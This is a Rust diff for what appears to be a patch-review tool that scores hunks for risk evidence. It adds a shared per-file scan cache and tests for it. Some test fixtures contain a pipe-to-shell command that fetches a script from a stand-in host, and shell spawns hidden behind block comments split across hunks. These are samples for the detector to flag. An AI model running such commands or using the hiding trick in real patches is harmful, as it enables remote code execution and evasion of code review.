@@ -135,14 +135,174 @@ impl std::fmt::Display for ViewError {
 
 impl std::error::Error for ViewError {}
 
+/// What one scan of a file gives a view: its score, its signals, and for each hunk that holds
+/// evidence the signals found in it (a bit for each place in `EvidenceSignal::ALL`).
+struct FileScan {
+    score: u32,
+    signals: Vec<&'static str>,
+    hunks: std::collections::HashMap<deep_diff_forge_core::HunkId, u32>,
+}
+
+/// The scans of a review for one view: each file is scanned once, when it is first asked for,
+/// as `rank` scans it (with its share of the patch's carried reading,
+/// [`deep_diff_forge_graph::CarriedShares`], worked out from the whole patch, so the labels do
+/// not depend on what is listed), so a view never disagrees with the rank.
+///
+/// A view that lists every file (the outline, and all hunks in risk order) needs each file's
+/// score, so it scans each file whole and takes the labels of its hunks from that one scan:
+/// before, such a view scanned a hunk once for the file's score and again for the hunk's
+/// labels, and an outline cost twice what the rank cost (second independent review of the
+/// integrity signals, IR2-H-5). A view of hunks picked by address or by path needs no score:
+/// it scans the hunks it shows and no others ([`shown_labels`]).
+struct Scans<'a> {
+    files: &'a [ReviewFile],
+    shares: deep_diff_forge_graph::CarriedShares,
+    done: Vec<std::cell::OnceCell<FileScan>>,
+    /// For each file, the hunks that are read together with another hunk of it
+    /// (`deep_diff_forge_graph::joined_hunks`), found when first asked for.
+    joined: Vec<std::cell::OnceCell<Vec<bool>>>,
+    /// For each file, the kinds it is read as (`deep_diff_forge_graph::FileKinds`), worked
+    /// out when first asked for: once for a file, however many of its hunks a view shows.
+    kinds: Vec<std::cell::OnceCell<deep_diff_forge_graph::FileKinds>>,
+    /// For each file, whether the reading of release 0.8.4 reads some of its hunks as one
+    /// text (`deep_diff_forge_graph::HunkLabels::read_together`), found when first asked for.
+    together: Vec<std::cell::OnceCell<bool>>,
+}
+
+impl<'a> Scans<'a> {
+    fn of(files: &'a [ReviewFile]) -> Self {
+        Self {
+            files,
+            shares: deep_diff_forge_graph::CarriedShares::of(files),
+            done: files.iter().map(|_| std::cell::OnceCell::new()).collect(),
+            joined: files.iter().map(|_| std::cell::OnceCell::new()).collect(),
+            kinds: files.iter().map(|_| std::cell::OnceCell::new()).collect(),
+            together: files.iter().map(|_| std::cell::OnceCell::new()).collect(),
+        }
+    }
+
+    /// Whether the reading of release 0.8.4 reads hunks of file `index` as one text (the file
+    /// is one the patch creates in more than one hunk), or the file is one of several sections
+    /// of its path that are also read as one file. That reading goes from hunk to hunk
+    /// within the bound the files of the patch share, so the labels of its hunks are those of
+    /// the scan of the file, which reads it with its share.
+    fn read_together(&self, index: usize) -> bool {
+        *self.together[index].get_or_init(|| {
+            deep_diff_forge_graph::HunkLabels::new(&self.files[index]).read_together() > 1
+                || self.shares.joined_across_sections(index)
+        })
+    }
+
+    /// The kinds file `index` is read as. For a file whose name gives no language they come
+    /// from a pass over every hunk of the file, so they are found once and kept: a view of
+    /// many hunks of such a file by path found them again for each hunk, and cost the square
+    /// of the number of hunks (eighth independent review, IR8-M-2: 26 s for a page of 2,768
+    /// hunks that had cost 0.3 s).
+    fn kinds(&self, index: usize) -> &deep_diff_forge_graph::FileKinds {
+        self.kinds[index].get_or_init(|| deep_diff_forge_graph::FileKinds::of(&self.files[index]))
+    }
+
+    /// Whether `hunk` of file `index` is read together with another hunk of that file: Git
+    /// must put the two one straight after the other, or their positions say it does, and
+    /// then the evidence of a hunk is not the evidence of that hunk read alone.
+    fn joined(&self, index: usize, hunk: usize) -> bool {
+        self.joined[index]
+            .get_or_init(|| deep_diff_forge_graph::joined_hunks(&self.files[index]))
+            .get(hunk)
+            .copied()
+            .unwrap_or(false)
+    }
+
+    /// The scan of file `index`, made now if it has not been.
+    fn file(&self, index: usize) -> &FileScan {
+        self.done[index].get_or_init(|| {
+            let assessment = deep_diff_forge_graph::assess_file_in_patch(
+                &self.files[index],
+                &self.shares,
+                index,
+            );
+            let mut hunks = std::collections::HashMap::new();
+            for item in &assessment.evidence {
+                let place = deep_diff_forge_graph::EvidenceSignal::ALL
+                    .iter()
+                    .position(|signal| *signal == item.signal)
+                    .unwrap_or(0);
+                *hunks.entry(item.hunk).or_insert(0u32) |= 1 << place;
+            }
+            FileScan {
+                score: assessment.score,
+                signals: assessment.signals.iter().map(|s| s.label()).collect(),
+                hunks,
+            }
+        })
+    }
+
+    /// The labels of the evidence in `hunk` of file `index`, in the order of
+    /// `EvidenceSignal::ALL`: what `hunk_signals` gives, without a second scan of a file that
+    /// was scanned whole.
+    fn labels(&self, index: usize, hunk: &PatchHunk) -> Vec<&'static str> {
+        let bits = self.file(index).hunks.get(&hunk.id).copied().unwrap_or(0);
+        deep_diff_forge_graph::EvidenceSignal::ALL
+            .iter()
+            .enumerate()
+            .filter(|(place, _)| bits & (1 << place) != 0)
+            .map(|(_, signal)| signal.label())
+            .collect()
+    }
+}
+
+/// The labels of the evidence in hunk `hunk` of file `index`, for a view that shows it: from
+/// the scan of its file when the view scanned every file for its order (`whole`), and else
+/// from a scan of that hunk alone. A hunk that is read together with other hunks of its file
+/// (a file created as several hunks, hunks that touch, hunks of added lines only) has no
+/// scan of its own. When the view shows that one hunk and no other (`single`), the texts it
+/// stands in are read and nothing else of the file; else its labels come from the one scan
+/// of its file, which is then made once for all such hunks of the file. A `git diff` with
+/// context lines writes no such hunks; a `git diff -U0` does (each of its hunks of added
+/// lines goes on from the last hunk that ends the file), and there a view of one hunk costs
+/// one reading of the run that hunk is in, where the scan of the file reads every hunk alone
+/// as well (seventh independent review, IR7-L-2).
+///
+/// The hunks of a file that the reading of release 0.8.4 reads as one text (a file the patch
+/// creates in more than one hunk, [`Scans::read_together`]) are read as joined hunks are: from
+/// the scan of the file, or for a view of that one hunk with the file's share of the patch's
+/// carried reading (`deep_diff_forge_graph::hunk_signals_in_patch`), so that its labels are
+/// those `rank` gives it.
+///
+/// Review V3 round 10, VD3R10-M-1, and the third independent review, IR3-L-1: a view of one
+/// hunk picked by its address took the labels from a scan of the whole file, so it paid for
+/// every other hunk of that file (1.8 s for a one-line hunk beside a hostile one that the
+/// view did not show; before the scans were shared, 0.00 s).
+fn shown_labels(
+    scans: &Scans,
+    whole: bool,
+    single: bool,
+    index: usize,
+    hunk: usize,
+) -> Vec<&'static str> {
+    let file = &scans.files[index];
+    let joined = scans.joined(index, hunk) || scans.read_together(index);
+    let signals = if whole || (joined && !single) {
+        return scans.labels(index, &file.patch_twin.hunks[hunk]);
+    } else if joined {
+        deep_diff_forge_graph::hunk_signals_in_patch(file, hunk, &scans.shares, index)
+    } else {
+        deep_diff_forge_graph::hunk_signals_alone(file, hunk, scans.kinds(index))
+    };
+    signals
+        .unwrap_or_default()
+        .into_iter()
+        .map(deep_diff_forge_graph::EvidenceSignal::label)
+        .collect()
+}
+
 /// Files in review-risk order (highest first, then by path), as `rank` orders them.
-fn risk_order(files: &[ReviewFile]) -> Vec<(usize, u32, Vec<&'static str>)> {
-    let mut order: Vec<(usize, u32, Vec<&'static str>)> = files
-        .iter()
-        .enumerate()
-        .map(|(i, file)| {
-            let (score, signals) = deep_diff_forge_graph::score_file(file);
-            (i, score, signals.iter().map(|s| s.label()).collect())
+fn risk_order(scans: &Scans) -> Vec<(usize, u32, Vec<&'static str>)> {
+    let files = scans.files;
+    let mut order: Vec<(usize, u32, Vec<&'static str>)> = (0..files.len())
+        .map(|i| {
+            let scan = scans.file(i);
+            (i, scan.score, scan.signals.clone())
         })
         .collect();
     order.sort_by(|a, b| {
@@ -170,7 +330,11 @@ fn line_counts(hunk: &PatchHunk) -> (usize, usize) {
 }
 
 /// A hunk's header facts, without its lines.
-fn hunk_head(file: &ReviewFile, hunk: &PatchHunk) -> serde_json::Map<String, Value> {
+fn hunk_head(
+    file: &ReviewFile,
+    hunk: &PatchHunk,
+    evidence: &[&'static str],
+) -> serde_json::Map<String, Value> {
     let (old_lines, new_lines) = hunk.counts();
     let (additions, deletions) = line_counts(hunk);
     let mut hazards: Vec<&str> = Vec::new();
@@ -206,10 +370,6 @@ fn hunk_head(file: &ReviewFile, hunk: &PatchHunk) -> serde_json::Map<String, Val
     if !hazards.is_empty() {
         map.insert("hazards".into(), json!(hazards));
     }
-    let evidence: Vec<&str> = deep_diff_forge_graph::hunk_signals(file, hunk)
-        .into_iter()
-        .map(deep_diff_forge_graph::EvidenceSignal::label)
-        .collect();
     if !evidence.is_empty() {
         map.insert("evidence".into(), json!(evidence));
     }
@@ -316,7 +476,8 @@ fn position(text: &str) -> Option<usize> {
 /// [`ViewError::Budget`] or [`ViewError::Cursor`] for a bad page request.
 pub fn outline(review: &SealedReview, page: &Page) -> Result<Value, ViewError> {
     let (files, seal) = (review.files(), review.seal());
-    let order = risk_order(files);
+    let scans = Scans::of(files);
+    let order = risk_order(&scans);
     let (start_file, start_hunk) = resume(page, seal, "outline", |item| {
         order
             .get(item)
@@ -352,7 +513,7 @@ pub fn outline(review: &SealedReview, page: &Page) -> Result<Value, ViewError> {
         });
         let mut used = size(&entry) + 1;
         for (h, hunk) in file.patch_twin.hunks.iter().enumerate().skip(first) {
-            let head = Value::Object(hunk_head(file, hunk));
+            let head = Value::Object(hunk_head(file, hunk, &scans.labels(*index, hunk)));
             let cost = size(&head) + 1;
             // A page always makes progress: its first hunk is listed even when it is over.
             let first_on_page = entries.is_empty() && h == first;
@@ -405,8 +566,22 @@ pub fn hunks(
     selection: &Selection,
     page: &Page,
 ) -> Result<Value, ViewError> {
+    hunks_with(review, &Scans::of(review.files()), selection, page)
+}
+
+/// [`hunks`], with the scans it makes left for the caller to see (a test looks at which files
+/// were scanned whole).
+fn hunks_with(
+    review: &SealedReview,
+    scans: &Scans,
+    selection: &Selection,
+    page: &Page,
+) -> Result<Value, ViewError> {
     let (files, seal) = (review.files(), review.seal());
-    let (units, key) = select(files, selection)?;
+    let (units, key) = select(scans, selection)?;
+    // Only the listing of every hunk scans every file (for the order): then the labels are
+    // those scans'. A selection scans what it shows.
+    let whole = matches!(selection, Selection::All);
     let (start_unit, start_line) = resume(page, seal, &key, |item| {
         units
             .get(item)
@@ -423,7 +598,8 @@ pub fn hunks(
         } else {
             0
         };
-        let mut entry = Value::Object(hunk_head(file, hunk));
+        let labels = shown_labels(scans, whole, units.len() == 1, f, h);
+        let mut entry = Value::Object(hunk_head(file, hunk, &labels));
         entry["path"] = json!(file.path);
         entry["line_offset"] = json!(offset);
         entry["complete"] = json!(true);
@@ -472,10 +648,10 @@ pub fn hunks(
 
 /// The (file, hunk) pairs a selection names, in order, and the key its cursor is bound to.
 fn select(
-    files: &[ReviewFile],
+    scans: &Scans,
     selection: &Selection,
 ) -> Result<(Vec<(usize, usize)>, String), ViewError> {
-    select_with(files, selection, &|hunk: &PatchHunk, path: &str| {
+    select_with(scans, selection, &|hunk: &PatchHunk, path: &str| {
         hunk.address(path)
     })
 }
@@ -489,14 +665,15 @@ fn select(
 /// which `catch_unwind` cannot contain), and every requested address hashed every hunk again
 /// (4,000 addresses over 4,000 hunks held a worker for 18 s).
 fn select_with(
-    files: &[ReviewFile],
+    scans: &Scans,
     selection: &Selection,
     address: &dyn Fn(&PatchHunk, &str) -> String,
 ) -> Result<(Vec<(usize, usize)>, String), ViewError> {
     use std::collections::{HashMap, HashSet};
+    let files = scans.files;
     match selection {
         Selection::All => {
-            let units = risk_order(files)
+            let units = risk_order(scans)
                 .into_iter()
                 .flat_map(|(f, _, _)| (0..files[f].patch_twin.hunks.len()).map(move |h| (f, h)))
                 .collect();
@@ -624,10 +801,10 @@ mod tests {
         let file = &r.files()[0];
         let hunks = &file.patch_twin.hunks;
         assert_eq!(
-            hunk_head(file, &hunks[0])["hazards"],
+            hunk_head(file, &hunks[0], &[])["hazards"],
             json!(["bidi_control"])
         );
-        assert!(!hunk_head(file, &hunks[1]).contains_key("hazards"));
+        assert!(!hunk_head(file, &hunks[1], &[]).contains_key("hazards"));
         let lines: Vec<Value> = hunks[0].lines.iter().map(line_json).collect();
         assert_eq!(lines[0]["hazards"], json!(["bidi_control"]));
         assert_eq!(lines[1]["hazards"], json!(["bidi_control"]));
@@ -868,6 +1045,181 @@ mod tests {
         assert!(second["next_cursor"].is_null());
     }
 
+    /// A view that scans every file takes each hunk's labels from the one scan of its file.
+    /// They are the labels a scan of that hunk alone gives, for every hunk: with evidence in
+    /// some hunks, none in others, and one in a hunk of 30 KB (which a parser under a budget
+    /// did not read, and marked `syntax_unchecked`).
+    #[test]
+    fn a_hunks_labels_come_from_the_one_scan_of_its_file() {
+        let pad = "a".repeat(30_000);
+        let r = review(&format!(
+            "--- a/tests/a.rs\n+++ b/tests/a.rs\n@@ -1,1 +1,3 @@\n fn t() {{\n+    assert!(\n+        true);\n@@ -10,1 +11,2 @@\n fn u() {{\n+    let n = 1;\n@@ -20,1 +22,3 @@\n fn v() {{\n+    x.unwrap();\n+    todo!();\n--- a/src/b.rs\n+++ b/src/b.rs\n@@ -1,1 +1,4 @@\n fn w() {{\n+    assert!(\n+        true);\n+    // {pad}\n"
+        ));
+        let files = r.files();
+        let scans = Scans::of(files);
+        let mut seen = Vec::new();
+        for (f, file) in files.iter().enumerate() {
+            for (h, hunk) in file.patch_twin.hunks.iter().enumerate() {
+                let alone: Vec<&str> = deep_diff_forge_graph::hunk_signals(file, h)
+                    .unwrap()
+                    .into_iter()
+                    .map(deep_diff_forge_graph::EvidenceSignal::label)
+                    .collect();
+                assert_eq!(scans.labels(f, hunk), alone, "file {f}, hunk {h}");
+                for single in [true, false] {
+                    assert_eq!(shown_labels(&scans, true, single, f, h), alone);
+                    assert_eq!(shown_labels(&scans, false, single, f, h), alone);
+                }
+                seen.push(alone);
+            }
+        }
+        assert_eq!(
+            seen,
+            [
+                vec!["trivial_assert"],
+                vec![],
+                vec!["stub_added", "panic_path_added"],
+                vec!["trivial_assert"],
+            ]
+        );
+    }
+
+    /// Hunks that are read together have the labels the file's scan gives them in every
+    /// view. Here a file is created as two hunks, and the second completes a call the first
+    /// began (sixth independent review of the integrity signals, IR6-H-3): read alone,
+    /// neither hunk has the call. A `git diff` with context lines writes no such hunks, so
+    /// for its patches a picked hunk is still scanned alone. A view of one such hunk reads
+    /// the texts that hunk stands in and does not scan the file (IR7-L-2).
+    #[test]
+    fn hunks_read_together_have_the_labels_of_the_files_scan() {
+        let r = review(
+            "diff --git a/src/lib.rs b/src/lib.rs\nnew file mode 100644\n--- /dev/null\n+++ b/src/lib.rs\n@@ -0,0 +1,2 @@\n+pub fn a() {}\n+pub fn evil(x: Option<u32>) -> u32 { x.unwrap\n@@ -2,0 +3,1 @@\n+() }\n",
+        );
+        let files = r.files();
+        for (whole, single) in [(true, false), (false, false), (false, true)] {
+            let scans = Scans::of(files);
+            assert_eq!(
+                shown_labels(&scans, whole, single, 0, 0),
+                ["panic_path_added"]
+            );
+            assert_eq!(shown_labels(&scans, whole, single, 0, 1), [""; 0]);
+            // only the view of one hunk leaves the file unscanned
+            assert_eq!(scans.done[0].get().is_none(), single, "{whole} {single}");
+        }
+    }
+
+    /// Review V3 round 10, VD3R10-M-1, and the third independent review, IR3-L-1. A view of
+    /// hunks picked by address or by path scans the hunks it shows: no file is scanned whole
+    /// for it. Before, the labels of one picked hunk came from a scan of its whole file, and
+    /// a one-line hunk cost what the hostile hunk beside it cost (1.8 s; 4 s in the review's
+    /// own patch). Only the listing of every hunk scans every file, for the order.
+    #[test]
+    fn a_selection_scans_only_the_hunks_it_shows() {
+        let r = review(
+            "--- a/tests/a.rs\n+++ b/tests/a.rs\n@@ -1,1 +1,2 @@\n fn cheap() {\n+    let n = 1;\n@@ -10,1 +11,3 @@\n fn other() {\n+    assert!(\n+        true);\n--- a/src/b.rs\n+++ b/src/b.rs\n@@ -1,1 +1,2 @@\n fn w() {\n+    x.unwrap();\n",
+        );
+        let files = r.files();
+        let cheap = files[0].patch_twin.hunks[0].address(&files[0].path);
+        let other = files[0].patch_twin.hunks[1].address(&files[0].path);
+        let scanned = |scans: &Scans| -> Vec<bool> {
+            scans.done.iter().map(|file| file.get().is_some()).collect()
+        };
+        let labels = |answer: &Value| -> Vec<Value> {
+            answer["hunks"]
+                .as_array()
+                .unwrap()
+                .iter()
+                .map(|hunk| hunk["evidence"].clone())
+                .collect()
+        };
+        for (selection, expected) in [
+            (Selection::Addresses(vec![cheap.clone()]), vec![json!(null)]),
+            (
+                Selection::Addresses(vec![other, cheap]),
+                vec![json!(["trivial_assert"]), json!(null)],
+            ),
+            (
+                Selection::Paths(vec!["tests/a.rs".to_owned()]),
+                vec![json!(null), json!(["trivial_assert"])],
+            ),
+            (
+                Selection::Paths(vec!["src/b.rs".to_owned()]),
+                vec![json!(["panic_path_added"])],
+            ),
+        ] {
+            let scans = Scans::of(files);
+            let answer = hunks_with(&r, &scans, &selection, &Page::default()).unwrap();
+            assert_eq!(labels(&answer), expected, "{selection:?}");
+            assert_eq!(scanned(&scans), [false, false], "{selection:?}");
+        }
+        // every hunk, in risk order: each file is scanned, once, and the labels are the same
+        let scans = Scans::of(files);
+        let all = hunks_with(&r, &scans, &Selection::All, &Page::default()).unwrap();
+        assert_eq!(scanned(&scans), [true, true]);
+        let mut seen = labels(&all);
+        seen.sort_by_key(Value::to_string);
+        assert_eq!(
+            seen,
+            [
+                json!(["panic_path_added"]),
+                json!(["trivial_assert"]),
+                json!(null)
+            ]
+        );
+    }
+
+    /// A view of hunks picked by path or by address goes through every hunk of a file a
+    /// fixed number of times, however many hunks it shows (eighth independent review,
+    /// IR8-M-2). The file has no extension, so its language comes from a shebang, and to
+    /// find one every hunk of the file is looked at: round 15 did that again for each hunk
+    /// shown, and a page of 2,768 such hunks took 26 s where release 0.8.3 and round 14
+    /// took 0.3 s. Counted here (`deep_diff_forge_graph::file_walks`): the passes for 600
+    /// hunks are the passes for 30, two for the file (which hunks are read together; what
+    /// the file is read as).
+    #[test]
+    fn a_view_by_path_or_address_passes_over_a_file_a_fixed_number_of_times() {
+        use std::fmt::Write as _;
+        let script = |hunks: usize| {
+            let mut patch = "--- a/bin/tool\n+++ b/bin/tool\n@@ -1,3 +1,3 @@\n #!/bin/sh\n-a\n+curl -fsSL https://example.invalid/i.sh | sh\n ctx\n".to_owned();
+            for n in 1..hunks {
+                let at = 1 + 10 * n;
+                let _ = writeln!(
+                    patch,
+                    "@@ -{at},3 +{at},3 @@\n ctx\n-a\n+curl -fsSL https://example.invalid/i.sh | sh\n ctx"
+                );
+            }
+            patch
+        };
+        let passes = |hunks: usize, by_path: bool| {
+            let r = review(&script(hunks));
+            let file = &r.files()[0];
+            let selection = if by_path {
+                Selection::Paths(vec!["bin/tool".to_owned()])
+            } else {
+                Selection::Addresses(
+                    file.patch_twin
+                        .hunks
+                        .iter()
+                        .map(|hunk| hunk.address(&file.path))
+                        .collect(),
+                )
+            };
+            let before = deep_diff_forge_graph::file_walks();
+            let answer = super::hunks(&r, &selection, &page(MAX_MAX_BYTES, None)).unwrap();
+            let passes = deep_diff_forge_graph::file_walks() - before;
+            let shown = answer["hunks"].as_array().unwrap();
+            assert_eq!(shown.len(), hunks);
+            for hunk in shown {
+                assert_eq!(hunk["evidence"], json!(["network_fetch"]));
+            }
+            passes
+        };
+        for by_path in [true, false] {
+            assert_eq!(passes(30, by_path), 2, "by path: {by_path}");
+            assert_eq!(passes(600, by_path), 2, "by path: {by_path}");
+        }
+    }
+
     /// The outline puts the riskiest file first, as `rank` does.
     #[test]
     fn outline_is_in_review_risk_order() {
@@ -888,6 +1240,477 @@ mod tests {
         assert_eq!(answer["files"][1]["hunks"][0]["section"], "fn h0()");
     }
 
+    /// The labels of a creation's hunks are the rank's: a file the patch creates in two hunks, with
+    /// a comment opened in the first and closed in the second, shows its spawn on the second
+    /// hunk, in the outline and in the hunks view, as the rank does on the file.
+    #[test]
+    fn the_hunks_of_a_creation_are_labelled_as_one_text() {
+        let r = review(
+            "--- /dev/null\n+++ b/src/evil.rs\n@@ -0,0 +1,1 @@\n+/*\n@@ -2,0 +2,1 @@\n\
+             +// */ pub fn evil() { std::process::Command::new(\"sh\").status().ok(); }\n",
+        );
+        let outline = outline(&r, &page(MAX_MAX_BYTES, None)).unwrap();
+        let listed = &outline["files"][0]["hunks"];
+        assert!(listed[0].get("evidence").is_none(), "{listed:#}");
+        assert_eq!(listed[1]["evidence"], json!(["process_spawn"]));
+        let all = hunks(&r, &Selection::All, &page(MAX_MAX_BYTES, None)).unwrap();
+        assert!(all["hunks"][0].get("evidence").is_none(), "{all:#}");
+        assert_eq!(all["hunks"][1]["evidence"], json!(["process_spawn"]));
+        let ranked = deep_diff_forge_graph::RankedFile::scored(&r.files()[0]);
+        assert_eq!(ranked.evidence.len(), 1);
+    }
+
+    /// Hunks asked for by address in any order, the hunks of two files in turn, are labelled
+    /// as by path, from one scan of each file (found in review, 2026-11-15: a reader made
+    /// again whenever the file changed, reading a creation's hunks from its first for each
+    /// hunk asked out of order, took 6.2 s for the 8,000 hunks of a new file by address in
+    /// reverse, against 0.13 s by path). Counted, not timed. (On the 0.8.4 line the views had a
+    /// reader of their own for such a file, and this test counted its lines and what it kept;
+    /// in the integrated views the file's one scan is the reader, and it is counted here.)
+    #[test]
+    fn hunks_by_address_in_any_order_are_read_once_for_each_file() {
+        use std::fmt::Write as _;
+        const HUNKS: usize = 400;
+        let mut text = String::new();
+        for name in ["a", "b"] {
+            let _ = write!(text, "--- /dev/null\n+++ b/src/{name}.rs\n");
+            for h in 0..HUNKS {
+                let line = match h % 10 {
+                    3 => format!("let {name}{h} = 1; /*"),
+                    4 => format!("// */ std::process::Command::new(\"{name}{h}\");"),
+                    _ => format!("let {name}{h} = 2;"),
+                };
+                let _ = write!(text, "@@ -0,0 +{},1 @@\n+{line}\n", h + 1);
+            }
+        }
+        let r = review(&text);
+        let files = r.files();
+        let in_order: Vec<(usize, usize)> = (0..2)
+            .flat_map(|f| (0..HUNKS).map(move |h| (f, h)))
+            .collect();
+        let in_turn_reversed: Vec<(usize, usize)> =
+            (0..HUNKS).rev().flat_map(|h| [(0, h), (1, h)]).collect();
+        let read = |units: &[(usize, usize)]| {
+            let scans = Scans::of(files);
+            let mut got: Vec<_> = units
+                .iter()
+                .map(|&(f, h)| ((f, h), shown_labels(&scans, false, units.len() == 1, f, h)))
+                .collect();
+            got.sort();
+            let scanned = scans
+                .done
+                .iter()
+                .filter(|scan| scan.get().is_some())
+                .count();
+            (scanned, got)
+        };
+        let (work, labelled) = read(&in_order);
+        // One scan for each file, whatever the order the hunks are asked in.
+        assert_eq!(work, 2);
+        let (in_turn, the_same) = read(&in_turn_reversed);
+        assert_eq!(in_turn, work, "the two files in turn, reversed");
+        assert!(the_same == labelled, "labels differ by the order asked");
+        let spawns = labelled.iter().filter(|(_, labels)| !labels.is_empty());
+        assert_eq!(spawns.count(), 2 * HUNKS / 10);
+        // And through the view: by address, the two files in turn and reversed, each hunk has
+        // the head it has by path.
+        let whole = page(MAX_MAX_BYTES, None);
+        let paths = Selection::Paths(vec!["src/a.rs".into(), "src/b.rs".into()]);
+        let by_path = hunks(&r, &paths, &whole).unwrap();
+        let listed = by_path["hunks"].as_array().unwrap();
+        assert_eq!(listed.len(), 2 * HUNKS);
+        let address = |unit: &Value| unit["address"].as_str().unwrap().to_owned();
+        let (a, b) = listed.split_at(HUNKS);
+        let asked: Vec<String> = a
+            .iter()
+            .zip(b)
+            .rev()
+            .flat_map(|(a, b)| [address(a), address(b)])
+            .collect();
+        let by_address = hunks(&r, &Selection::Addresses(asked.clone()), &whole).unwrap();
+        let answered = by_address["hunks"].as_array().unwrap();
+        assert_eq!(answered.len(), asked.len());
+        for (unit, wanted) in answered.iter().zip(&asked) {
+            let same = listed.iter().find(|u| address(u) == *wanted).unwrap();
+            assert_eq!(unit, same);
+        }
+        assert_eq!(
+            answered[2 * HUNKS - 10]["evidence"],
+            json!(["process_spawn"])
+        );
+    }
+
+    /// The reading carried from hunk to hunk of a creation stops at its bound at the same hunk
+    /// in every view: the outline page by page (each page after the first starts in the middle
+    /// of the file), the hunks by path, by address in reverse and each address alone, and the
+    /// rank's evidence. A creation of 48 hunks of about 8 KiB, each leaving a comment open that
+    /// the next closes before a spawn: the hunks from the second to the bound have the spawn,
+    /// the others nothing.
+    #[test]
+    fn a_creation_past_the_bound_has_the_same_labels_in_every_view() {
+        use std::fmt::Write as _;
+        let mut text = "--- /dev/null\n+++ b/src/x.rs\n".to_owned();
+        let mut at = 1;
+        for hunk in 0..48 {
+            let mut lines = vec!["// */ std::process::Command::new(\"sh\");".to_owned()];
+            lines.extend((0..100).map(|n| format!("let v{hunk}_{n} = {n:<60};")));
+            lines.push("let x = 1; /*".to_owned());
+            let _ = writeln!(text, "@@ -0,0 +{at},{} @@", lines.len());
+            for line in &lines {
+                let _ = writeln!(text, "+{line}");
+            }
+            at += lines.len();
+        }
+        let r = review(&text);
+        let file = &r.files()[0];
+        let bound = deep_diff_forge_graph::HunkLabels::new(file).read_together();
+        assert!(bound > 2 && bound < 40, "{bound}");
+        // The reading of release 0.8.4: the spawn from the second hunk to the bound.
+        let mut released = deep_diff_forge_graph::HunkLabels::new(file);
+        for h in 0..48 {
+            let spawn = released.of(h) == [deep_diff_forge_graph::EvidenceSignal::ProcessSpawn];
+            assert_eq!(
+                spawn,
+                (1..bound).contains(&h),
+                "the reading of 0.8.4, hunk {h}"
+            );
+        }
+        // Since the merge with the integrity signals every view gives every hunk but the
+        // first the spawn: their reading of a creation as one text has no bound, and a
+        // fragment is also read from inside a block comment. (Was `(1..bound)`, the reading of
+        // 0.8.4, in every view.)
+        let wanted: Vec<Value> = (0..48)
+            .map(|h| {
+                if h > 0 {
+                    json!(["process_spawn"])
+                } else {
+                    Value::Null
+                }
+            })
+            .collect();
+        // The rank.
+        let evidence = deep_diff_forge_graph::file_evidence(file);
+        for (h, hunk) in file.patch_twin.hunks.iter().enumerate() {
+            let has = evidence.iter().any(|e| e.hunk == hunk.id);
+            assert_eq!(has, !wanted[h].is_null(), "rank, hunk {h}");
+        }
+        // The outline, page by page.
+        let (mut cursor, mut outlined, mut pages) = (None, Vec::new(), 0);
+        for _ in 0..10_000 {
+            let answer = outline(&r, &page(MIN_MAX_BYTES, cursor.clone())).unwrap();
+            for entry in answer["files"].as_array().unwrap() {
+                outlined.extend(entry["hunks"].as_array().unwrap().iter().cloned());
+            }
+            pages += 1;
+            cursor = answer["next_cursor"].as_str().map(str::to_owned);
+            if cursor.is_none() {
+                break;
+            }
+        }
+        assert!(pages > 4, "{pages} pages");
+        let evidence_of = |units: &[Value]| -> Vec<Value> {
+            units.iter().map(|u| u["evidence"].clone()).collect()
+        };
+        assert_eq!(evidence_of(&outlined), wanted, "outline by cursor");
+        // The hunks by path, by address in reverse, and each address alone.
+        let whole = page(MAX_MAX_BYTES, None);
+        let by_path = hunks(&r, &Selection::Paths(vec!["src/x.rs".into()]), &whole).unwrap();
+        let listed = by_path["hunks"].as_array().unwrap();
+        assert_eq!(evidence_of(listed), wanted, "by path");
+        let addresses: Vec<String> = listed
+            .iter()
+            .map(|u| u["address"].as_str().unwrap().to_owned())
+            .collect();
+        let reversed: Vec<String> = addresses.iter().rev().cloned().collect();
+        let by_address = hunks(&r, &Selection::Addresses(reversed), &whole).unwrap();
+        let mut answered = evidence_of(by_address["hunks"].as_array().unwrap());
+        answered.reverse();
+        assert_eq!(answered, wanted, "by address in reverse");
+        for (h, address) in addresses.iter().enumerate() {
+            let one = hunks(&r, &Selection::Addresses(vec![address.clone()]), &whole).unwrap();
+            assert_eq!(one["hunks"][0]["evidence"], wanted[h], "hunk {h} alone");
+        }
+    }
+
+    /// A creation of `path` (Rust, or JavaScript when `path` ends in `.js`) whose hunk `h` is
+    /// exactly `sizes[h]` bytes of new side, each line counted with its end: a line that closes
+    /// the comment the hunk before left open and then spawns a process, filler lines, and a
+    /// line that opens a comment. In the reading of release 0.8.4 only the reading carried from
+    /// hunk to hunk finds the spawn, in every hunk read together but the first; the readings of
+    /// the integrity signals find it in every hunk but the first.
+    fn sized_creation(path: &str, sizes: &[usize]) -> String {
+        use std::fmt::Write as _;
+        const LAST: &str = "let x = 1; /*";
+        let first = if std::path::Path::new(path)
+            .extension()
+            .is_some_and(|ext| ext == "js")
+        {
+            "// */ execSync(\"sh\");"
+        } else {
+            "// */ std::process::Command::new(\"sh\");"
+        };
+        let mut text = format!("--- /dev/null\n+++ b/{path}\n");
+        let mut at = 1;
+        for &size in sizes {
+            let mut lines = vec![first.to_owned()];
+            let mut left = size - (first.len() + 1) - (LAST.len() + 1);
+            while left > 0 {
+                let line = left.min(301) - 1;
+                lines.push(match line {
+                    0 => String::new(),
+                    1 => "x".to_owned(),
+                    _ => format!("//{}", "a".repeat(line - 2)),
+                });
+                left -= line + 1;
+            }
+            lines.push(LAST.to_owned());
+            let _ = writeln!(text, "@@ -0,0 +{at},{} @@", lines.len());
+            for line in &lines {
+                let _ = writeln!(text, "+{line}");
+            }
+            at += lines.len();
+        }
+        text
+    }
+
+    /// The carried reading one request may read in all, in bytes.
+    const CARRIED_BOUND: usize = 256 * 1024;
+
+    /// What `request` answers, and the bytes the reading carried from hunk to hunk read for it
+    /// on this thread, by whatever readers it made; held at most [`CARRIED_BOUND`].
+    fn carried_by<T>(request: impl FnOnce() -> T) -> (T, usize) {
+        let before = deep_diff_forge_graph::carried_bytes_on_this_thread();
+        let answer = request();
+        let read = deep_diff_forge_graph::carried_bytes_on_this_thread() - before;
+        assert!(read <= CARRIED_BOUND, "{read}");
+        (answer, read)
+    }
+
+    /// A patch whose created files, Rust and JavaScript, share the carried reading, and the
+    /// budget runs out in the middle of a file: two creations of 96 KiB (Rust, then
+    /// JavaScript), one of 80 KiB (JavaScript) cut after its hunk 25, two more of 8 KiB left
+    /// with nothing, a file that exists, and two small creations (Rust, then JavaScript) that
+    /// fit in what is left (32 hunks at most a file, so that the rank lists every item). The
